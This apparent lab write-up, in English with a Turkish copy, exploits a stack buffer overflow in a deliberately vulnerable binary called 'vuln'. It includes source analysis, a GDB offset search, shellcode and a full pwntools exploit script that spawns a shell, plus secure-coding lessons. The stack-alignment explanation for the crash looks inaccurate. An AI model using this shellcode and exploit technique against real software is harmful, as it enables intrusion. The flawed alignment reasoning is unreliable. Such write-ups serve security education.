# [Write-up] Vuln - Buffer Overflow and Shellcode

## 1. Introduction and Target Analysis

In this study, a security analysis was performed on the binary file named `vuln`, whose source code was provided and which runs on the Linux x86_64 architecture. Code execution on the system was achieved by exploiting the identified Buffer Overflow vulnerability.

The source code of the analyzed `vuln()` function is as follows:

```c
void vuln(void)
{
  char buf [64];
  
  printf("%p\n",buf);
  fflush(stdout);
  read(0,buf,0xff);
  printf("you wrote: %s",buf);
  return;
}

```

### Vulnerability Detection at Code Level:

1. **Address Leak:** The `printf("%p\n", buf);` line prints the dynamic starting address of the `buf` array in memory to the screen. This situation makes stack addresses predictable, rendering the ASLR protection ineffective.
2. **Buffer Overflow:** The `buf` variable is defined to occupy **64 bytes** (`0x40`) in memory. However, the `read(0, buf, 0xff);` function allows the user to write up to **255 bytes** (`0xff`) of data into this space. Due to the lack of boundary checking, this creates a buffer overflow vulnerability.

---

## 2. Binary File Protections Analysis (Mitigation Check)

To determine the exploitation strategy, the security mechanisms on the file were examined using the `checksec` tool:

```text
RELRO          STACK CANARY      NX              PIE            FILE
Partial RELRO  No canary found   NX disabled     No PIE         vuln

```

* **Stack Canary (No canary found):** The absence of a stack protection mechanism (canary) indicates that the function's return address (RIP) can be safely overwritten.
* **NX (NX disabled):** The Data Execution Prevention (No-Execute) being disabled means that the machine codes (Shellcode) written to the stack region can be directly executed by the processor.

---

## 3. Dynamic Analysis and Offset Calculation

To determine exactly at which byte I controlled the function's return address (RIP), I resorted to dynamic analysis methods. In this process, GDB (GNU Debugger) and Metasploit pattern tools were used.

1. **Pattern Generation:** I generated a 100-character unique pattern using the `msf-pattern_create -l 100` command.
2. **Running on GDB:** When I started the program with GDB and sent this pattern as input, the program stopped, giving a `Segmentation fault` error.
3. **Querying Stack State:** To examine the value at the very top of the stack (`RSP`) at the moment of the crash, I ran the `x/gx $rsp` command:

```text
(gdb) x/gx $rsp
0x7fffffffdd38: 0x6341356341346341

```

4. **Offset Verification:** When I fed the `0x6341356341346341` hex value into the `msf-pattern_offset` tool, I determined that the exact crash point was the **72nd byte**.

* *Theoretical Verification:* 64 bytes of `buf` space + 8 bytes of Saved RBP = 72 bytes. The first 8 bytes after the 72-byte padding directly determine the address to be redirected to (RIP).

---

## 4. Exploitation Process and Challenges Encountered

After determining the offset, using the Python `pwntools` library, I placed a shellcode that would execute the `/bin/sh` command into the stack and wrote the leaked `buf` address to the return address.

### Error Encountered (SIGSEGV / EOF):

Although the exploit script ran successfully on the first attempt, the process terminated with `exit code -11 (SIGSEGV)` right before the shellcode was triggered.

### Cause of the Error (Stack Alignment):

In modern 64-bit Linux systems, the processor expects the stack to be aligned to a 16-byte boundary before making a system call (`syscall`). When jumping directly to the leaked address, the stack structure gets corrupted, and the shellcode overwrites its own executable code space.

### Solution (NOP Sled):

To overcome this issue, I applied the **NOP Sled (`0x90`)** technique, which stabilizes the stack structure and slides the processor. Instead of directing the processor directly to the beginning of the `buf`, I directed it to the middle of the NOP space by adding a small margin to the address value (`buf_address + 16`).

---

## 5. Final Exploit

With the following Python script, the process was automated, the address leak was caught mid-air, and the stack was successfully overflowed:

```python
from pwn import *

# start the target
p = process('/home/kali/Downloads/vuln')

# get the address
adres = p.recvline().strip()
buf = int(adres, 16)
print("[-] Found address:", hex(buf))

# shellcode and nop sled
sc = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05"
payload = b"\x90" * 16 + sc

# complete padding and add the address (72 byte offset)
payload += b"A" * (72 - len(payload))
payload += p64(buf + 16)

# send and connect
p.sendline(payload)
p.interactive()

```

---

## 6. Conclusion and Takeaways

When the developed exploit was run, the program stepped out of its normal flow the moment it processed the `return` command, jumped to the NOP sled injected into the stack, and executed the shellcode. The process transitioned to interactive mode, and a local command line (shell) was obtained on the target system.

### Technical Lessons Learned:

1. **Need for Secure Coding:** It was observed that the lack of boundary checking in input functions like `read()` leads to critical system vulnerabilities. This vulnerability can be permanently prevented by specifying the limit as `read(0, buf, sizeof(buf));`.
2. **Risk of Information Leaks:** Modern defense mechanisms like ASLR are not sufficient on their own; address leaks at the software level can completely bypass these defense layers.
3. **Impact of Architecture:** When developing exploits on 64-bit systems, the necessity of considering hardware and OS-level constraints, such as Stack Alignment, was practically experienced.

# [Write-up] Vuln - Buffer Overflow ve Shellcode

## 1. Giriş ve Hedef Analizi

Bu çalışmada, kaynak kodu verilen ve Linux x86_64 mimarisinde çalışan `vuln` adlı binary dosyanın güvenlik analizi gerçekleştirilmiş ve tespit edilen Buffer Overflow zafiyeti kullanılarak sistem üzerinde kod yürütülmüştür.

Analiz edilen `vuln()` fonksiyonunun kaynak kodu şu şekildedir:

```c
void vuln(void)
{
  char buf [64];
  
  printf("%p\n",buf);
  fflush(stdout);
  read(0,buf,0xff);
  printf("you wrote: %s",buf);
  return;
}

```

### Kod Seviyesinde Zafiyet Tespiti:

1. **Adres Sızıntısı :** `printf("%p\n", buf);` satırı, `buf` dizisinin bellekteki dinamik başlangıç adresini ekrana yazdırmaktadır. Bu durum, stack adreslerinin öngörülebilir olmasını sağlayarak ASLR korumasını işlevsiz hale getirmektedir.
2. **Buffer Overflow :**  `buf` değişkeni hafızada **64 byte** (`0x40`) yer kaplayacak şekilde tanımlanmıştır. Ancak `read(0, buf, 0xff);` fonksiyonu, kullanıcının bu alana **255 byte** (`0xff`) veri yazmasına izin vermektedir. Sınır kontrolü yapılmaması nedeniyle bu durum bir yığın taşması zafiyeti doğurmaktadır.

---

## 2. Binary Dosya Korumalarının İncelenmesi (Mitigation Check)

İstismar stratejisini belirlemek adına `checksec` aracı ile dosya üzerindeki güvenlik mekanizmaları incelenmiştir:

```text
RELRO          STACK CANARY      NX              PIE            FILE
Partial RELRO  No canary found   NX disabled     No PIE         vuln

```

* **Stack Canary (No canary found):** Yığın koruma mekanizmasının (canary) bulunmaması, fonksiyonun geri dönüş adresinin (RIP) güvenli bir şekilde ezilebileceğini göstermektedir.
* **NX (NX disabled):** Veri yürütme engellemesinin (No-Execute) kapalı olması, yığın (stack) bölgesine yazılan makine kodlarının (Shellcode) işlemci tarafından doğrudan yürütülebileceği anlamına gelmektedir.

---

## 3. Dinamik Analiz ve Ofset Hesaplama

Fonksiyonun geri dönüş adresini (RIP) tam olarak kaçıncı byte'ta kontrol ettiğimi belirlemek amacıyla dinamik analiz yöntemlerine başvurdum. Bu süreçte GDB (GNU Debugger) ve Metasploit pattern araçları kullanılmıştır.

1. **Desen Üretimi:** `msf-pattern_create -l 100` komutu ile 100 karakter uzunluğunda benzersiz bir desen ürettim.
2. **GDB Üzerinde Çalıştırma:** Programı GDB ile başlatıp bu deseni girdi olarak gönderdiğimde program `Segmentation fault` hatası vererek durduruldu.
3. **Yığın Durumu Sorgulama:** Çökme anında stackin en tepesindeki (`RSP`) değeri incelemek için `x/gx $rsp` komutunu çalıştırdım:
```text
(gdb) x/gx $rsp
0x7fffffffdd38: 0x6341356341346341

```


4. **Ofset Doğrulama:** `0x6341356341346341` hex değerini `msf-pattern_offset` aracına verdiğimde, tam çökme noktasının **72. byte** olduğunu tespit ettim.
* *Teorik Doğrulama:* 64 byte `buf` alanı + 8 byte Saved RBP = 72 byte. 72 byte'lık padding sonraki ilk 8 byte doğrudan yönlendirilecek adresi (RIP) belirlemektedir.



---

## 4. İstismar Süreci ve Karşılaşılan Zorluklar

Ofset tespiti sonrasında, Python `pwntools` kütüphanesini kullanarak yığına `/bin/sh` komutunu yürütecek bir shellcode yerleştirdim ve geri dönüş adresine sızan `buf` adresini yazdım.

### Karşılaşılan Hata (SIGSEGV / EOF):

İlk denemede istismar betiği başarılı bir şekilde çalışmasına rağmen, shellcode tetiklenmeden hemen önce süreç `exit code -11 (SIGSEGV)` ile sonlandı.

### Hatanın Sebebi (Stack Alignment):

64-bit modern Linux sistemlerinde, işlemci sistem çağrısı (`syscall`) yapmadan önce yığının 16-byte sınırına hizalanmış olmasını bekler. Doğrudan sızan adrese atlama yapıldığında yığının yapısı bozulmakta ve shellcode kendi yürütülebilir kod alanını ezmektedir.

### Çözüm (NOP Sled):

Bu sorunu aşmak için yığının yapısını stabilize edecek ve işlemciyi kaydıracak **NOP Sled (`0x90`)** tekniğini uyguladım. İşlemciyi doğrudan `buf` başlangıcına değil, adres değerine küçük bir pay ekleyerek (`buf_address + 16`) NOP alanının ortasına yönlendirdim.

---

## 5. Nihai İstismar (Exploit)

Aşağıdaki Python betiği ile süreç otomatikleştirilmiş, adres sızıntısı havada yakalanmış ve Stack başarılı bir şekilde taşırılmıştır:

```python
from pwn import *

# hedefi baslat
p = process('/home/kali/Downloads/vuln')

# adresi al
adres = p.recvline().strip()
buf = int(adres, 16)
print("[-] Bulunan adres:", hex(buf))

# shellcode ve nop sled
sc = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05"
payload = b"\x90" * 16 + sc

# padding tamamla ve adresi ekle (72 byte ofset)
payload += b"A" * (72 - len(payload))
payload += p64(buf + 16)

# gonder ve baglan
p.sendline(payload)
p.interactive()

```

---

## 6. Sonuç ve Çıkarımlar

Geliştirilen exploit çalıştırıldığında, program `return` komutunu işlediği anda kendi normal akışından çıkarak yığına enjekte edilen NOP kızağına zıplamış ve shellcode'u çalıştırmıştır. Süreç interaktif moda geçiş yapmış ve hedef sistem üzerinde yerel bir komut satırı (shell) elde edilmiştir.

### Alınan Teknik Dersler:

1. **Güvenli Kodlama İhtiyacı:** `read()` ve benzeri girdi fonksiyonlarında sınır kontrolünün yapılmamasının kritik sistem zaafiyetlerine yol açtığı gözlemlenmiştir. Bu zaafiyet, `read(0, buf, sizeof(buf));` şeklinde sınır belirtilerek kalıcı olarak önlenebilir.
2. **Bilgi Sızıntılarının Riski:** ASLR gibi modern savunma mekanizmaları tek başına yeterli değildir; yazılım seviyesindeki adres sızıntıları bu savunma katmanlarını tamamen devre dışı bırakabilmektedir.
3. **Mimarinin Etkisi:** 64-bit sistemlerde istismar geliştirirken yığın hizalaması (Stack Alignment) gibi donanımsal ve işletim sistemi düzeyindeki kısıtlamaların dikkate alınması gerekliliği pratik olarak tecrübe edilmiştir.
